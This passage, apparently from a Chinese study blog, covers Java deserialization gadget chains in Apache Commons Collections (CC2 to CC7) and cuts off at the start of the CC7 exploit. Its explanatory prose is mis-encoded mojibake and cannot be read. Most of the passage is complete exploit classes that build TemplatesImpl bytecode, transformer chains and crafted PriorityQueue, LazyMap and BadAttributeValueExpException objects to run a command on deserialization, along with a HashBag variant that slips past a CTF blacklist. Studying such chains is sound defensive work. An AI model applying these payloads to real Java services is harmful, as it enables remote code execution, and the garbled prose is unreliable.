_class[_transletIndex].newInstance();</code></pre><p>è¿™é‡ŒdefineTransletClasses()å¯ä»¥è¿˜åŸbytecodeä¸ºclass.åé¢çš„newInstance()åˆ™å¯ä»¥å®ä¾‹åŒ–è¿™ä¸ªclass.åœ¨è¿™ä¸ªå®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­staticæ–¹æ³•å°±ä¼šæ‰§è¡Œã€‚æ‰€ä»¥è¾¾æˆäº†ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><p>å†ç¨å¾®å¤šå›é¡¾ä¸‹å‰é¢æˆ‘ä»¬è¾¾åˆ°çš„è¿›åº¦ï¼Œå°±æ˜¯æˆ‘ä»¬å·²ç»å¯ä»¥ä»»æ„è°ƒç”¨transformäº†,åªéœ€ä¸€ä¸ªå¯æ§å¯¹è±¡ã€‚é‚£ä¹ˆè¿™é‡Œå†ç”¨ä¹‹å‰ç»å¸¸ç”¨åˆ°çš„InvokerTransformer.transformåå°„æ¥è°ƒç”¨TemplatesImpl.newtransformer</p><p>æœ€ç»ˆexp</p><pre><code class="java">package top.bycsec;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class cc2 {    public static void main(String[] args) throws Exception {        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);        constructor.setAccessible(true);        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);        TransformingComparator comparator = new TransformingComparator(transformer);        PriorityQueue queue = new PriorityQueue(1);        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;byc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        cc.makeClassInitializer().insertBefore(cmd);        String randomClassName = &quot;byc404&quot; + System.nanoTime();        cc.setName(randomClassName);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));         byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]{classBytes};        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        Object[] queue_array = new Object[]{templates,1};        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);        queue_field.setAccessible(true);        queue_field.set(queue,queue_array);        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(queue,2);        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,comparator);        try{            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));            inputStream.readObject();        }catch(Exception e){            e.printStackTrace();        }    }    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    }    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {        Field field = null;        try {            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        }        catch (NoSuchFieldException ex) {            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        }        return field;    }}</code></pre><p>è¿™ä¸ªexpå‡ ä¸ªç»†èŠ‚è¿˜æ˜¯å€¼å¾—è¯´æ˜ä¸€ä¸‹çš„ã€‚ä¸è¿‡æˆ‘è¿˜æ˜¯å·æ‡’ä¸‹ä¸æ·±å…¥äº†ï¼Œå°±å½“åšä¸€äº›æ³¨æ„äº‹é¡¹ç®€å•è¯´æ˜ä¸‹ã€‚</p><p>1.ä¸ºäº†è¿›å…¥<code>defineTransletClasses</code>éœ€è¦æŠŠæ¶æ„ç±»çš„çˆ¶ç±»è®¾ç½®ä¸ºAbstractTransletã€‚å¦åˆ™_transletIndexä¼šå°äº0çˆ†å‡ºé”™è¯¯ã€‚<br>2.é€šè¿‡åå°„çš„æ–¹å¼æ¥è®¾ç½®queueçš„å€¼ï¼Œè€Œæ˜¯ç›´æ¥addã€‚è¿™é‡Œæˆ‘ä»¬queueçš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯templateså³TemplatesImpl.class.newInstance();ã€‚è¿™æ˜¯ä¸€ä¸ªç±»ã€‚è€Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯1.è¿™ä¸¤ä¸ªå…ƒç´ åœ¨addæ—¶ä¼šå‡ºç°æ¯”è¾ƒå‡ºé”™ã€‚æ‰€ä»¥å¾—ä¿è¯ç±»å‹ä¸€è‡´ã€‚ä¸è¿‡è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯é‡Œé¢æ”¾ä¸¤ä¸ªä¸€æ ·çš„å…ƒç´ å³éƒ½ä¸ºtemplate.</p><ul><li>CommonsCollections3</li></ul><p>CC3åˆå›åˆ°äº†CommonsCollections3.1çš„ä¾èµ–ã€‚<br>æœ‰ç‚¹åƒCC1+CC2ã€‚ç”¨åˆ°äº†ä¸¤ä¸ªé“¾å­çš„å…³é”®å†…å®¹ã€‚</p><p>åŒºåˆ«åœ¨äºç”¨äº†TrAXFilterè°ƒç”¨newTransformer()</p><pre><code class="java">public TrAXFilter(Templates templates)  throws        TransformerConfigurationException    {        _templates = templates;        _transformer = (TransformerImpl) templates.newTransformer();        _transformerHandler = new TransformerHandlerImpl(_transformer);        _useServicesMechanism = _transformer.useServicesMechnism();    }</code></pre><p>ç„¶åä¸åŒäºä»¥å¤–çš„InvokeTransformer,å®ƒæ”¹ç”¨äº†InstantiateTransformer.å…¶transformæ–¹æ³•å¦‚ä¸‹</p><pre><code class="java">public Object transform(Object input) {    try {        if (!(input instanceof Class)) {            throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName()));        } else {            Constructor con = ((Class)input).getConstructor(this.iParamTypes);            return con.newInstance(this.iArgs);        }</code></pre><p>è¿™é‡Œåˆ›å»ºäº†ç±»å®ä¾‹ï¼Œå¦‚æœæŠŠinputè®¾ç½®ä¸ºTrAXFilter,é‚£ä¹ˆå°±ä¼šåœ¨è¿™é‡Œå®ä¾‹åŒ–çš„æ—¶å€™è°ƒç”¨å…¶æ„é€ æ–¹æ³•ï¼Œè§¦å‘TemplatesImpl#newTransformerã€‚</p><p>exp</p><pre><code class="java">package top.bycsec;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class cc3 {    public static void main(String[] args) throws Exception {        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;byc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        cc.makeClassInitializer().insertBefore(cmd);        String randomClassName = &quot;byc404&quot; + System.nanoTime();        cc.setName(randomClassName);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]{classBytes};        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})        });        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);        handler_constructor.setAccessible(true);        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Deprecated.class,map);        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);        AnnotationInvocationHandler_Constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Deprecated.class,proxy_map);        try{            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc3&quot;));            outputStream.writeObject(handler);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc3&quot;));            inputStream.readObject();        }catch(Exception e){            e.printStackTrace();        }    }    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    }    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {        Field field = null;        try {            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        }        catch (NoSuchFieldException ex) {            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        }        return field;    }}</code></pre><ul><li>CommonsCollections4</li></ul><p>ä¾èµ–ç¯å¢ƒå˜ä¸ºCommons Collections 4.0</p><p>ä¼¼ä¹å°±æ˜¯ä¸ªæ‚äº¤â€¦â€¦å› ä¸ºä¾èµ–å˜ä¸º4.0äº†ã€‚ç›´æ¥ä½¿ç”¨CC2 ä¸­çš„queue+ CC3ä¸­çš„transformè°ƒç”¨ã€‚</p><p>exp</p><pre><code class="java">package top.bycsec;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class cc4 {    public static void main(String[] args) throws Exception{        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);        constructor.setAccessible(true);        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);        TransformingComparator comparator = new TransformingComparator(transformer);        PriorityQueue queue = new PriorityQueue(1);        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass(&quot;byc&quot;);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        cc.makeClassInitializer().insertBefore(cmd);        String randomClassName = &quot;byc404&quot; + System.nanoTime();        cc.setName(randomClassName);        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]{classBytes};        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);        setFieldValue(templates, &quot;_class&quot;, null);        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})        });        Object[] queue_array = new Object[]{templates,1};        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);        queue_field.setAccessible(true);        queue_field.set(queue,queue_array);        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);        size.setAccessible(true);        size.set(queue,2);        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,comparator);        try{            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc4&quot;));            outputStream.writeObject(queue);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc4&quot;));            inputStream.readObject();        }catch(Exception e){            e.printStackTrace();        }    }    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {        final Field field = getField(obj.getClass(), fieldName);        field.set(obj, value);    }    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {        Field field = null;        try {            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        }        catch (NoSuchFieldException ex) {            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        }        return field;    }}</code></pre><ul><li>CommonsCollections5</li></ul><p>cc5è·Ÿè¿‡ä¸€æ¬¡ã€‚å½“æ—¶æ²¡ç”¨jdk1.7çš„ç¯å¢ƒã€‚ç°åœ¨å®éªŒä¸‹jdk1.7 + cc3ä¾èµ–çš„exp.å¦å¤–å‘ç°è¿™ä¸ªé“¾å­cc3,cc4ä¾èµ–éƒ½å¯ä»¥ä½¿ç”¨ã€‚è²Œä¼¼æ˜¯ysoserialåªå†™äº†cc3çš„é“¾å­ã€‚ç¨å¾®æ”¹ä¸‹å°±å¯ä»¥ç”¨åœ¨cc4çš„ç¯å¢ƒäº†ã€‚</p><p>é¦–å…ˆé‡ç‚¹è¿˜æ˜¯æ„é€ é“¾å­æ¥è°ƒç”¨å–œé—»ä¹è§çš„åå°„transform rce payload.è¿™é‡Œçš„æ–¹æ³•åœ¨ç¬¬ä¸€ç¯‡å­¦ååºåˆ—åŒ–æ—¶å·²ç»è·Ÿè¿‡äº†</p><p>ç„¶åæ˜¯ä¸€ä¸ªç»†èŠ‚ï¼š</p><blockquote><p><code>TransformedMap.decorate()</code>æ–¹æ³•èƒ½å°†æ™®é€šçš„MapAè½¬æ¢ä¸ºTransformedMapBï¼ŒåŒæ—¶å¦‚æœ<code>TransformedMap.decorate()</code>æ–¹æ³•è®¾ç½®äº†ç¬¬äºŒä¸ªå‚æ•°keyTransformeræˆ–è€…ç¬¬ä¸‰ä¸ªå‚æ•°valueTransformerï¼Œå½“TransformedMapBè°ƒç”¨Mapçš„putæ–¹æ³•æˆ–è€…Map.Entryçš„setValueæ–¹æ³•å°±ä¼šè‡ªåŠ¨è§¦å‘åˆšæ‰è®¾ç½®çš„keyTransformeræˆ–è€…valueTransformerç›¸åº”çš„Transformer</p></blockquote><p>ä¹‹æ‰€ä»¥æåˆ°<code>decorate()</code>æ˜¯å› ä¸ºæˆ‘è‡ªå·±è¿™ä¸€éƒ¨åˆ†cc1çš„é“¾å­åœ¨ä¹¦å†™expä¸­ç”¨çš„æ˜¯åå°„å®ä¾‹åŒ–çš„lazymapã€‚å½“æ—¶åªæ˜¯è·Ÿç€åˆ«äººçš„expç”¨åå°„å®ä¾‹åŒ–äº†ï¼Œç»“æœåæ¥å‘ç°æ˜æ˜cc3ä¾èµ–ä¸­ç›´æ¥decorateå°±å¯ä»¥åˆ›å»ºlazymapã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/39.PNG" class="lazyload" data-srcset="39.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™ä¸ªæ–¹æ³•åœ¨cc4ä¾èµ–ä¸­å˜ä¸ºäº†LazpMapæ–¹æ³•<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/40.PNG" class="lazyload" data-srcset="40.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åæ ¸å¿ƒè¿˜æ˜¯è·Ÿcc1ä¸€æ ·,æ­¤æ—¶åªè¦ä¸€ä¸ªè°ƒç”¨LazyMap#getçš„ä½ç½®æ¥è§¦å‘rceã€‚</p><p>ç”¨åˆ°çš„gadgetæ˜¯TiedMapEntry#toString =&gt; getValue =&gt; get.éœ€è¦this.mapä¸ºLazyMap.è·Ÿè¿‡ä¸€éå°±ä¸å†è¯´äº†ã€‚</p><p>å†æ¥ä¸‹æ¥æ˜¯BadAttributeValueExpExceptionæ¥è§¦å‘toString.<br>å› ä¸ºå…¶readObjectä¸­<code>valobj.toString</code>çš„valobjæ¥è‡ªè¾“å…¥çš„valã€‚æ‰€ä»¥ç›´æ¥åå°„è®¾ç½®ä¸ºTiedMapEntryå³å¯</p><pre><code class="java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {    ObjectInputStream.GetField gf = ois.readFields();    Object valObj = gf.get(&quot;val&quot;, null);    ......</code></pre><p>exp</p><pre><code class="java">package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(java.lang.Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),        };        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap hashMap = new HashMap&lt;String, String&gt;();        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;placeholder&quot;);        Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);        field.setAccessible(true);        field.set(badAttributeValueExpException, tiedMapEntry);        try {            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));            oos.writeObject(badAttributeValueExpException);            oos.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));            inputStream.readObject();        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p>ç„¶åä¸Šé¢è¯´äº†ã€‚æ¢æˆcc4ä¾èµ–æ˜¯é€šæ€çš„ã€‚æˆ‘ä»¬åªéœ€å°†expä¸­ä¾èµ–å…¨éƒ¨æ¢æˆ4çš„ï¼Œç„¶ådecorateæ–¹æ³•æ¢æˆlazyMapæ¥å®ä¾‹åŒ–LazyMapå³å¯</p><p>exp</p><pre><code class="java">package top.bycsec;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(java.lang.Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),        };        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap hashMap = new HashMap&lt;String, String&gt;();        Map lazyMap = LazyMap.lazyMap(hashMap,chainedTransformer);        //Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;placeholder&quot;);        Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);        field.setAccessible(true);        field.set(badAttributeValueExpException, tiedMapEntry);        try {            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));            oos.writeObject(badAttributeValueExpException);            oos.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));            inputStream.readObject();        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><ul><li>CommonsCollections6</li></ul><p>æ¯”è¾ƒç±»ä¼¼CC5çš„é“¾å­ã€‚ç„¶ååˆ©ç”¨ç¯å¢ƒä¹Ÿæ˜¯3,4é€šæ€ã€‚</p><p>cc6çš„gadgetä¸cc5çš„åŒºåˆ«åœ¨äºæ²¡æœ‰åˆ©ç”¨TiedMapEntry#toString,è€Œæ˜¯TiedMapEntry#hashCode</p><p>è¿™ä¸ªæ–¹æ³•åœ¨URLDNSä¸­å‡ºç°è¿‡,åœ¨ååºåˆ—åŒ–æ—¶ä¼šé‡æ–°è®¡ç®—å¯¹è±¡çš„ hashCode.</p><pre><code class="java">public int hashCode() {    Object value = this.getValue();    return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());}public Object getValue() {    return this.map.get(this.key);}</code></pre><p>è·ŸtoStringä¸€æ ·è°ƒç”¨äº†getValueã€‚æ‰€ä»¥å°±åŸºæœ¬ä¸€æ ·äº†ã€‚</p><p>è§¦å‘hashcodeçš„æ–¹æ³•æ˜¯åˆ©ç”¨Hashmapç±»çš„hash</p><pre><code class="java">final int hash(Object k) {    int h = hashSeed;    if (0 != h &amp;&amp; k instanceof String) {        return sun.misc.Hashing.stringHash32((String) k);    }    h ^= k.hashCode();    // This function ensures that hashCodes that differ only by    // constant multiples at each bit position have a bounded    // number of collisions (approximately 8 at default load factor).    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);}</code></pre><p>åŠ ä¸ŠhashMap.put</p><pre><code class="java">public V put(K key, V value) {    if (table == EMPTY_TABLE) {        inflateTable(threshold);    }    if (key == null)        return putForNullKey(value);    int hash = hash(key);    int i = indexFor(hash, table.length);    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {        Object k;        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {            V oldValue = e.value;            e.value = value;            e.recordAccess(this);            return oldValue;        }    }</code></pre><p>è¿™æ ·å°±å¯ä»¥ç›´æ¥putè§¦å‘äº†ã€‚ç„¶åå®˜æ–¹çš„é“¾å­ä¸çŸ¥é“ä¸ºå•¥åŠ ä¸Šäº†ä¸€ä¸ªHashset,æœ‰ç‚¹å¥‡æ€ªã€‚</p><p>exp</p><pre><code class="java">package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc6 {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(java.lang.Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),        };        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;placeholder&quot;);        HashMap hashMap = new HashMap();        hashMap.put(tiedMapEntry, &quot;byc&quot;);        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(chainedTransformer, transformers);        innerMap.clear();        try {            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./out.bin&quot;));            oos.writeObject(hashMap);            oos.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.bin&quot;));            inputStream.readObject();        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p>åŒæ ·ä¹Ÿæ˜¯ccä¾èµ–3,4é€šç”¨ã€‚</p><p>ç„¶åå¼ºç½‘æ¯å½“æ—¶ä¸€é“javaé¢˜è®°å¾—å°±æ˜¯ç”¨çš„cc6çš„é“¾å­æ”¹äº†ä¸‹ã€‚å› ä¸ºå½“æ—¶æ˜¯å­˜åœ¨æ‰‹å†™çš„é»‘åå•ï¼Œä¸èƒ½ç”¨hashmap,ä½†æ˜¯å¯ä»¥æ‰¾æ›¿ä»£çš„hashcodeæ¥åˆ©ç”¨ã€‚æ‰€ä»¥ç”¨HashBagæ›¿æ¢ä¸€ä¸‹å°±è¡Œã€‚</p><pre><code class="java">HashBag hashMap = new HashBag();hashMap.add(tiedMapEntry, 1);</code></pre><p>hashBagç»§æ‰¿äº†ä¸€ä¸ªæŠ½è±¡ç±»,ç„¶åæ–¹æ³•åŸºæœ¬è·ŸHashMapå·®ä¸å¤šã€‚æ‰€ä»¥å°æ”¹ä¸‹å°±å¯ä»¥ç›´æ¥æ‰“äº†ã€‚</p><ul><li>CommonsCollections7</li></ul><p>cc7çš„é“¾å­æ˜¯é€šè¿‡AbstractMap#equalsæ¥è§¦å‘LazyMap#get</p><pre><code class="java">public boolean equals(Object o) {    if (o == this)        return true;    if (!(o instanceof Map))        return false;    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;    if (m.size() != size())        return false;    try {        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();        while (i.hasNext()) {            Entry&lt;K,V&gt; e = i.next();            K key = e.getKey();            V value = e.getValue();            if (value == null) {                if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))                    return false;            } else {                if (!value.equals(m.get(key)))                    return false;            }        }    } catch (ClassCastException unused) {        return false;    } catch (NullPointerException unused) {        return false;    }    return true;}</code></pre><p>è¿™é‡Œå¦‚æœæ§åˆ¶mä¸ºlazymapå³å¯è§¦å‘rce.</p><p>ç„¶åcc7æ˜¯åœ¨HashTable#reconstitutionPutä¸­è°ƒç”¨è¿‡equalsæ–¹æ³•</p><pre><code class="java">int hash = hash(key);    int index = (hash &amp; 0x7FFFFFFF) % tab.length;    for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) {        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {            throw new java.io.StreamCorruptedException();        }        ......</code></pre><p>ç„¶åHashTableçš„readObjectä¹Ÿè°ƒç”¨è¿‡äº†reconstitutionPut.æ‰€ä»¥å¯ä»¥è§¦å‘ã€‚</p><p>exp</p><pre><code class="java">package 